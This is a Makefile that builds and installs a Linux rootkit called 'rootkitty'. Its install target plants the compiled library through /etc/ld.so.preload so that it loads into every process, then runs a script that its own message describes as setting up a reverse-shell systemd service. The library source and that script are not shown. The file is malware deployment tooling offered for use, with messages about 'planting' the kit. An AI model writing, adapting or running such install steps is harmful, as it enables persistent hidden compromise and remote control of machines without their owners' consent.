CC = gcc
SRCS = src/rootkitty-lib.c 
OUT = rootkitty.so
CFLAGS = -lpam -fPIC -shared -lssl -ldl 
DBG = $(CFLAGS) -Wall -Wextra -Wshadow -g -O2

#default
all:
	@printf "\x1b[32m[+] Compiling rootkitty... >^..^<\x1b[0m\n"
	$(CC) $(SRCS) -o $(OUT) $(CFLAGS) $(LIBS)
	@printf "\x1b[33m[i] You only compiled the kit.\n"
	@printf "[i] Before planting make sure to edit src/soystemd.sh\n"
	@printf "[i] If you wish to plant the kit use: \"make install\"\x1b[0m\n"
	

# for debugging purposes
debug:
	@printf "\x1b[32m[+] Compiling rootkitty + debug...  >^..^<\x1b[0m\n"
	$(CC) $(SRCS) -o $(OUT) $(DBG)

install: rootkitty.so
	@printf "\x1b[32m[+] Planting rootkitty to ld.so.preload.... >^..^<\x1b[0m\n"
	realpath $(OUT) > /etc/ld.so.preload
	@printf "\x1b[32m[+] Setting Reverse Shell Systemd-Service... >^..^<\x1b[0m\n"
  chmod +x src/soystemd.sh 
	./src/soystemd.sh

delete: rootkitty.so
	@printf "\x1b[31m[!] Deleting Rootkitty from system... >^..^<\x1b[0m\n"
	echo "" > /etc/ld.so.preload
	rm $(OUT)
	rm /etc/systemd/system/rootkitty.service
	@printf "\x1b[32m[+] Successfully deleted Rootkitty from ld.so.preload!\x1b[0m\n"
